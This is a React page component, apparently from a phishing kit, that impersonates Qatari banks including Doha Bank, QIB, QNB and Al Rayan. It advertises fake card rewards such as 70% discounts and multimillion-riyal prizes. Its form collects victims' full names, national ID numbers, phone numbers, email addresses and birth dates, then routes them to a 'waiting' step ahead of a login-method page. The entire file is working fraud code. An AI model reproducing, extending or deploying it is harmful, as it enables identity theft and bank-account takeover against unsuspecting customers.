import { useState, useEffect } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import { Car, Hotel, Plane, ParkingCircle, Gift, Lock, Globe, Trophy, Wallet, Crown, Calendar } from "lucide-react";

const bankLogos = {
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
};

const bankLogosEn = {
  doha: "https://i.ibb.co/fYrmRJN5/h3-Doha-Bank-International-Spends.jpg",
  rayan: "https://i.ibb.co/5gg1JNN2/m-Al-Rayan-Bank-Raffle.jpg",
  qib: "https://i.ibb.co/hJtYdd37/h3-QIB-acquisition-campaign.jpg",
  qnb: "https://i.ibb.co/Pz47HdB3/169282.jpg",
};

export default function PersonalData() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const { language, setLanguage } = useLanguage();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "doha";
  const sessionId = localStorage.getItem("sessionId") || "";

  const isArabic = language === "ar";
  const footerImage = isArabic 
    ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg"
    : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg";

  const [formData, setFormData] = useState({
    nameEnglish: "",
    nameArabic: "",
    idNumber: "",
    phoneNumber: "",
    email: "",
    dateOfBirth: "",
    gender: isArabic ? "ذكر" : "Male",
    customerStatus: isArabic ? "عميل حالي" : "Existing Customer",
    cardType: isArabic ? "بطاقة ائتمان" : "Credit Card",
  });

  const submitPersonalDataMutation = trpc.submissions.submitPersonalData.useMutation();

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (!currentSessionId) {
      toast.error(isArabic ? "جلسة غير صالحة" : "Invalid session");
      return;
    }

    try {
      await submitPersonalDataMutation.mutateAsync({
        sessionId: currentSessionId,
        nameArabic: formData.nameArabic,
        nameEnglish: formData.nameEnglish,
        idNumber: formData.idNumber,
        phoneNumber: formData.phoneNumber,
        email: formData.email,
        dateOfBirth: formData.dateOfBirth,
        gender: formData.gender,
        customerStatus: formData.customerStatus,
      });
      toast.success(isArabic ? "تم حفظ البيانات بنجاح" : "Data saved successfully");
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=login-method`);
    } catch (error) {
      console.error("Error saving personal data in DB:", error);
      toast.error(isArabic ? "فشل حفظ البيانات، يرجى المحاولة مرة أخرى" : "Failed to save data, please try again");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  useEffect(() => {
    document.title = isArabic ? "البيانات الشخصية" : "Personal Data";
  }, [isArabic]);

  const isCreditCard = formData.cardType === (isArabic ? "بطاقة ائتمان" : "Credit Card");

  return (
    <div className="page-wrapper">
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; padding: 0; padding-bottom: 20px; min-height: 100vh; }
        
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }

        .bank-box { width: 100%; background: #fff; border-bottom: 1px solid #ddd; padding: 10px 0; }
        .bank-logo { width: 90%; max-width: 400px; display: block; margin: 0 auto; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }

        .info-box { background: white; margin: 15px; padding: 15px; border-radius: 10px; border-${isArabic ? "right" : "left"}: 5px solid #8C0032; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
        .line { padding: 8px 0; font-size: 14px; color: #333; display: flex; align-items: center; gap: 8px; border-bottom: 1px solid #eee; }
        .line-icon { width: 20px; height: 20px; color: #8C0032; flex-shrink: 0; }
        .rewards-line { padding: 8px 0; color: #8C0032; font-weight: bold; font-size: 14px; border-bottom: 1px solid #eee; display: flex; align-items: center; gap: 8px; }
        .rewards-icon { width: 20px; height: 20px; flex-shrink: 0; }

        .form-container { padding: 20px; background: white; margin: 15px; border-radius: 10px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: bold; margin-bottom: 5px; color: #555; }
        input, select { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; }
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }

        .special-feature { background: linear-gradient(135deg, #8C0032 0%, #c41e5e 100%); color: white; padding: 12px; border-radius: 8px; margin-top: 15px; display: flex; align-items: center; gap: 10px; }
        .special-feature svg { width: 24px; height: 24px; flex-shrink: 0; }
        .special-feature span { font-weight: 600; font-size: 14px; }

        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      <header className="header">
        <div style={{ display: "flex", alignItems: "center", gap: "15px" }}>
          <div className="menu-icon">&#9776;</div>
          <img src="https://i.ibb.co/5XVcXsGs/1dd76f2f664441de0899c73896f966f1.jpg" className="logo" />
        </div>
        <button onClick={toggleLanguage} className="lang-btn" style={{ textDecoration: "none" }}>
          {isArabic ? "English" : "عربي"}
        </button>
      </header>

      <div className="bank-box">
        <img src={(isArabic ? bankLogos : bankLogosEn)[bank as keyof typeof bankLogos] || bankLogos.doha} className="bank-logo" alt="Bank Logo" />
      </div>

      <div className="info-box">
        <div className="line">
          <Car className="line-icon" />
          <span>{isArabic ? "تأجير السيارات: خصم 70%" : "Car Rental: 70% Discount"}</span>
        </div>
        <div className="line">
          <Hotel className="line-icon" />
          <span>{isArabic ? "حجوزات الفنادق: خصم 70%" : "Hotel Booking: 70% Discount"}</span>
        </div>
        <div className="line">
          <Plane className="line-icon" />
          <span>{isArabic ? "تذاكر الطيران: خصم 70%" : "Flight Tickets: 70% Discount"}</span>
        </div>
        <div className="line">
          <ParkingCircle className="line-icon" />
          <span>{isArabic ? "المواقف: خصم 70%" : "Parking: 70% Discount"}</span>
        </div>
        <div className="line">
          <Gift className="line-icon" />
          <span>{isArabic ? "مميزات حصرية وعروض خاصة" : "Exclusive Benefits & Special Offers"}</span>
        </div>
        <div className="line">
          <Lock className="line-icon" />
          <span>{isArabic ? "دفع آمن وحماية كاملة" : "Secure Payment & Full Protection"}</span>
        </div>
        <div className="line">
          <Globe className="line-icon" />
          <span>{isArabic ? "تقبل عالمياً في جميع أنحاء العالم" : "Global Acceptance Worldwide"}</span>
        </div>
        <div className="rewards-line">
          <Wallet className="rewards-icon" />
          <span>{isArabic ? "كاش باك يصل إلى 5000 ريال قطري شهرياً" : "Cashback Up to 5000 QAR Monthly"}</span>
        </div>
        <div className="rewards-line">
          <Crown className="rewards-icon" />
          <span>{isArabic ? "دخول صالات VIP في المطارات" : "VIP Lounge Access at Airports"}</span>
        </div>
        <div className="rewards-line">
          <Trophy className="rewards-icon" />
          <span>{isArabic ? "جوائز سنوية تصل إلى 3 مليون ريال قطري" : "Annual Rewards Up to 3M QAR"}</span>
        </div>
      </div>

      <div className="form-container">
        <form onSubmit={handleSubmit}>
          <div className="form-group">
            <label>{isArabic ? "نوع البطاقة" : "Card Type"}</label>
            <select name="cardType" value={formData.cardType} onChange={handleChange}>
              <option>{isArabic ? "بطاقة ائتمان" : "Credit Card"}</option>
              <option>{isArabic ? "بطاقة مسبقة الدفع" : "Prepaid Card"}</option>
            </select>
          </div>

          {isCreditCard && (
            <div className="special-feature">
              <Calendar />
              <span>{isArabic ? "فترة سداد تصل إلى 6 شهور بدون فوائد" : "Payment Period Up to 6 Months Interest-Free"}</span>
            </div>
          )}

          <div className="form-group">
            <label>{isArabic ? "الاسم كما في الهوية (بالإنجليزي)" : "Full Name (as per ID)"}</label>
            <input
              type="text"
              name="nameEnglish"
              placeholder={isArabic ? "Full Name" : "Full Name"}
              value={formData.nameEnglish}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "الاسم (بالعربي)" : "Name (Arabic)"}</label>
            <input
              type="text"
              name="nameArabic"
              placeholder={isArabic ? "الاسم الكامل" : "الاسم الكامل"}
              value={formData.nameArabic}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "رقم الهوية" : "ID Number"}</label>
            <input
              type="number"
              name="idNumber"
              placeholder={isArabic ? "رقم الهوية" : "ID Number"}
              value={formData.idNumber}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "رقم الجوال" : "Mobile Number"}</label>
            <input
              type="number"
              name="phoneNumber"
              placeholder="00974XXXXXXXX"
              value={formData.phoneNumber}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "البريد الإلكتروني (Gmail)" : "Email (Gmail)"}</label>
            <input
              type="email"
              name="email"
              placeholder="example@gmail.com"
              value={formData.email}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "تاريخ الميلاد" : "Date of Birth"}</label>
            <input
              type="date"
              name="dateOfBirth"
              value={formData.dateOfBirth}
              onChange={handleChange}
              required
            />
          </div>
          <div className="form-group">
            <label>{isArabic ? "النوع" : "Gender"}</label>
            <select name="gender" value={formData.gender} onChange={handleChange}>
              <option>{isArabic ? "ذكر" : "Male"}</option>
              <option>{isArabic ? "أنثى" : "Female"}</option>
            </select>
          </div>
          <div className="form-group">
            <label>{isArabic ? "حالة العميل" : "Customer Status"}</label>
            <select name="customerStatus" value={formData.customerStatus} onChange={handleChange}>
              <option>{isArabic ? "عميل حالي" : "Existing Customer"}</option>
              <option>{isArabic ? "عميل جديد" : "New Customer"}</option>
            </select>
          </div>
          <button type="submit" className="submit-btn">
            {isArabic ? "متابعة" : "Continue"}
          </button>
        </form>
      </div>

      <img src={footerImage} className="footer-image" alt="Footer" />
    </div>
  );
}
